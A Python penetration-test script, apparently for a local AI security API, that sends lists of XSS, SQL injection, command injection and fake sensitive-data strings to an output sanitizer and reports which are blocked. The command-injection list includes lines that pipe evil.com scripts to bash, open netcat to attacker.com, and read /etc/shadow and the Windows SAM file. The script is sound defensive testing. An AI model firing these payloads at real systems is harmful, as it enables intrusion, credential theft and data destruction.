"""
Layer 2 Penetration Testing: Output Manipulation & Injection Attacks

Tests XSS, SQL injection, command injection, and output sanitization bypass.
"""

import requests
import json
from datetime import datetime


class Layer2Tester:
    """Layer 2: Output manipulation attacks"""
    
    def __init__(self, api_base_url="http://localhost:8000", api_key=None):
        self.api_base_url = api_base_url
        self.api_key = api_key
        self.results = []
        self.attack_counter = 0
    
    def _get_headers(self):
        headers = {"Content-Type": "application/json"}
        if self.api_key:
            headers["Authorization"] = f"Bearer {self.api_key}"
        return headers
    
    def _record(self, category, payload, result, severity, notes, env_note=""):
        self.attack_counter += 1
        self.results.append({
            "id": f"L2-{self.attack_counter:03d}",
            "category": category,
            "payload": payload[:100],
            "result": result,
            "severity": severity,
            "notes": notes,
            "env_note": env_note
        })
    
    def test_xss_attacks(self):
        """Test XSS injection"""
        print("\n" + "="*80)
        print("LAYER 2.1: XSS (CROSS-SITE SCRIPTING) ATTACKS")
        print("="*80)
        
        payloads = [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            
            # Event handlers
            "<div onmouseover='alert(1)'>hover me</div>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            
            # JavaScript protocol
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            
            # Encoded XSS
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",
            
            # Attribute injection
            "' onclick='alert(1)",
            "\" onload=\"alert(1)\"",
            
            # DOM-based XSS
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # base64: alert(1)
            
            # Filter bypass
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<IMG SRC=j&#X41vascript:alert('XSS')>",
            
            # Polyglot
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                # Test output sanitization
                response = requests.post(
                    f"{self.api_base_url}/api/v1/protect/output",
                    headers=self._get_headers(),
                    json={"output": payload, "context": "html"},
                    timeout=10
                )
                
                data = response.json()
                sanitized = data.get("sanitized_output", "")
                
                # Check if XSS was removed
                dangerous_patterns = [
                    "<script", "onerror", "onload", "onclick", "javascript:",
                    "alert(", "eval(", "<iframe", "<svg"
                ]
                
                is_safe = not any(pattern.lower() in sanitized.lower() for pattern in dangerous_patterns)
                
                result = "BLOCKED" if is_safe else "SUCCESSFUL"
                severity = "HIGH" if not is_safe else "INFO"
                
                notes = f"XSS {'removed' if is_safe else 'PRESENT in output'}"
                
                self._record("XSS", payload, result, severity, notes)
                
                icon = "🛡️ " if is_safe else "🚨"
                print(f"{icon} L2-{self.attack_counter:03d}: {result} - {payload[:60]}...")
                
            except Exception as e:
                print(f"❌ Error: {str(e)}")
    
    def test_sql_injection(self):
        """Test SQL injection"""
        print("\n" + "="*80)
        print("LAYER 2.2: SQL INJECTION ATTACKS")
        print("="*80)
        
        payloads = [
            # Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' OR 'a'='a",
            
            # UNION-based
            "' UNION SELECT * FROM users--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            
            # Stacked queries
            "'; DROP TABLE users--",
            "'; DELETE FROM users WHERE '1'='1",
            "'; UPDATE users SET password='hacked'--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SLEEP(5)--",
            
            # Time-based blind
            "'; WAITFOR DELAY '00:00:05'--",
            "' OR IF(1=1, SLEEP(5), 0)--",
            
            # Error-based
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--",
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                response = requests.post(
                    f"{self.api_base_url}/api/v1/protect/output",
                    headers=self._get_headers(),
                    json={"output": payload, "context": "sql"},
                    timeout=10
                )
                
                data = response.json()
                sanitized = data.get("sanitized_output", "")
                
                # Check if SQL keywords were escaped/removed
                sql_keywords = ["UNION", "SELECT", "DROP", "DELETE", "UPDATE", "INSERT", "--", "/*"]
                is_safe = not any(keyword in sanitized.upper() for keyword in sql_keywords)
                
                result = "BLOCKED" if is_safe else "SUCCESSFUL"
                severity = "CRITICAL" if not is_safe else "INFO"
                
                notes = f"SQL injection {'neutralized' if is_safe else 'POSSIBLE'}"
                env_note = "Note: SQL injection testing requires database integration (production feature)"
                
                self._record("SQL Injection", payload, result, severity, notes, env_note)
                
                icon = "🛡️ " if is_safe else "🚨"
                print(f"{icon} L2-{self.attack_counter:03d}: {result} - {payload[:60]}...")
                
            except Exception as e:
                print(f"❌ Error: {str(e)}")
    
    def test_command_injection(self):
        """Test command injection"""
        print("\n" + "="*80)
        print("LAYER 2.3: COMMAND INJECTION ATTACKS")
        print("="*80)
        
        payloads = [
            # Basic command injection
            "; ls -la",
            "| cat /etc/passwd",
            "& whoami",
            "&& id",
            
            # Command chaining
            "; cat /etc/shadow",
            "| nc attacker.com 4444",
            "&& curl http://evil.com/shell.sh | bash",
            
            # Backticks
            "`whoami`",
            "$(whoami)",
            "${IFS}cat${IFS}/etc/passwd",
            
            # Encoded
            "%0Als%20-la",
            "\\x0als\\x20-la",
            
            # Windows
            "& dir",
            "| type C:\\Windows\\System32\\config\\SAM",
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                response = requests.post(
                    f"{self.api_base_url}/api/v1/protect/output",
                    headers=self._get_headers(),
                    json={"output": payload, "context": "shell"},
                    timeout=10
                )
                
                data = response.json()
                sanitized = data.get("sanitized_output", "")
                
                # Check if command operators were removed
                cmd_operators = [";", "|", "&", "`", "$", "\\x"]
                is_safe = not any(op in sanitized for op in cmd_operators)
                
                result = "BLOCKED" if is_safe else "SUCCESSFUL"
                severity = "CRITICAL" if not is_safe else "INFO"
                
                notes = f"Command injection {'blocked' if is_safe else 'POSSIBLE'}"
                env_note = "Note: Command injection requires shell execution context (production feature)"
                
                self._record("Command Injection", payload, result, severity, notes, env_note)
                
                icon = "🛡️ " if is_safe else "🚨"
                print(f"{icon} L2-{self.attack_counter:03d}: {result} - {payload[:60]}...")
                
            except Exception as e:
                print(f"❌ Error: {str(e)}")
    
    def test_sensitive_data_leakage(self):
        """Test sensitive data detection and masking"""
        print("\n" + "="*80)
        print("LAYER 2.4: SENSITIVE DATA LEAKAGE")
        print("="*80)
        
        payloads = [
            # Credit cards
            "My credit card is 4532-1234-5678-9010",
            "Card: 5425233430109903",
            "Pay with 378282246310005",
            
            # API keys
            "API key: sk-1234567890abcdef1234567890abcdef",
            "Token: asg_uOsmRhzr6vf7HCaLRgH-WB6UgunAggyrRAuH5T_qV1U",
            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
            
            # Passwords
            "Password: MySecretP@ssw0rd123",
            "pwd=admin123",
            
            # Email addresses
            "Contact me at john.doe@example.com",
            "Email: sensitive@company.com",
            
            # Phone numbers
            "Call me at +1-555-123-4567",
            "Phone: (555) 987-6543",
            
            # SSN
            "SSN: 123-45-6789",
            "Social Security: 987654321",
            
            # Private keys
            "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC...",
            "-----BEGIN RSA PRIVATE KEY-----",
        ]
        
        for i, payload in enumerate(payloads, 1):
            try:
                response = requests.post(
                    f"{self.api_base_url}/api/v1/protect/output",
                    headers=self._get_headers(),
                    json={"output": payload, "context": "text"},
                    timeout=10
                )
                
                data = response.json()
                sanitized = data.get("sanitized_output", "")
                
                # Check if sensitive data was masked
                is_masked = "[REDACTED" in sanitized or "***" in sanitized or sanitized != payload
                
                result = "BLOCKED" if is_masked else "SUCCESSFUL"
                severity = "HIGH" if not is_masked else "INFO"
                
                notes = f"Sensitive data {'masked' if is_masked else 'LEAKED'}"
                
                self._record("Data Leakage", payload, result, severity, notes)
                
                icon = "🛡️ " if is_masked else "🚨"
                print(f"{icon} L2-{self.attack_counter:03d}: {result} - {payload[:60]}...")
                
            except Exception as e:
                print(f"❌ Error: {str(e)}")
    
    def generate_report(self):
        """Generate Layer 2 report"""
        print("\n" + "="*80)
        print("PENETRATION TEST REPORT - LAYER 2")
        print("="*80)
        
        total = len(self.results)
        blocked = sum(1 for r in self.results if r["result"] == "BLOCKED")
        successful = sum(1 for r in self.results if r["result"] == "SUCCESSFUL")
        
        critical = sum(1 for r in self.results if r["severity"] == "CRITICAL" and r["result"] != "BLOCKED")
        high = sum(1 for r in self.results if r["severity"] == "HIGH" and r["result"] != "BLOCKED")
        
        print(f"\n📊 SUMMARY")
        print(f"   Total Attacks:     {total}")
        print(f"   🛡️  Blocked:         {blocked} ({blocked/total*100:.1f}%)")
        print(f"   🚨 Successful:      {successful} ({successful/total*100:.1f}%)")
        print(f"\n🔥 SEVERITY (Unblocked)")
        print(f"   CRITICAL:          {critical}")
        print(f"   HIGH:              {high}")
        
        # Category breakdown
        print(f"\n📋 BY CATEGORY")
        categories = {}
        for r in self.results:
            cat = r["category"]
            if cat not in categories:
                categories[cat] = {"total": 0, "blocked": 0}
            categories[cat]["total"] += 1
            if r["result"] == "BLOCKED":
                categories[cat]["blocked"] += 1
        
        for cat, stats in categories.items():
            block_rate = stats["blocked"] / stats["total"] * 100
            print(f"   {cat:25} {stats['blocked']}/{stats['total']} blocked ({block_rate:.1f}%)")
        
        # Vulnerabilities
        print(f"\n🚨 VULNERABILITIES FOUND")
        vulns = [r for r in self.results if r["result"] == "SUCCESSFUL"]
        if vulns:
            for v in vulns[:10]:  # Show first 10
                print(f"\n   {v['id']} - {v['severity']}")
                print(f"   Category: {v['category']}")
                print(f"   Payload: {v['payload']}")
                if v['env_note']:
                    print(f"   Note: {v['env_note']}")
        else:
            print(f"   ✅ No vulnerabilities! All attacks blocked.")
        
        return {
            "total": total,
            "blocked": blocked,
            "successful": successful,
            "block_rate": blocked / total * 100 if total > 0 else 0
        }


def main():
    print("\n" + "="*80)
    print("LAYER 2: OUTPUT MANIPULATION & INJECTION ATTACKS")
    print("="*80)
    
    # Check server
    try:
        response = requests.get("http://localhost:8000/health", timeout=2)
        if response.status_code != 200:
            print("❌ API server not responding")
            return
    except:
        print("❌ Cannot connect to API server")
        return
    
    # Get API key
    import sys
    sys.path.insert(0, '/home/ubuntu/ai-security-guardian')
    from auth.api_key_manager import APIKeyManager
    manager = APIKeyManager("data/api_keys.db")
    api_key, _ = manager.generate_key("Layer2 Test", rate_limit=10000)
    
    # Run tests
    tester = Layer2Tester(api_key=api_key)
    tester.test_xss_attacks()
    tester.test_sql_injection()
    tester.test_command_injection()
    tester.test_sensitive_data_leakage()
    
    # Report
    stats = tester.generate_report()
    
    # Save
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    report_file = f"/home/ubuntu/pentest_layer2_{timestamp}.json"
    with open(report_file, 'w') as f:
        json.dump(tester.results, f, indent=2)
    
    print(f"\n💾 Results saved to: {report_file}")
    print(f"\nBlock Rate: {stats['block_rate']:.1f}%")
    print(f"Vulnerabilities: {stats['successful']}\n")


if __name__ == "__main__":
    main()
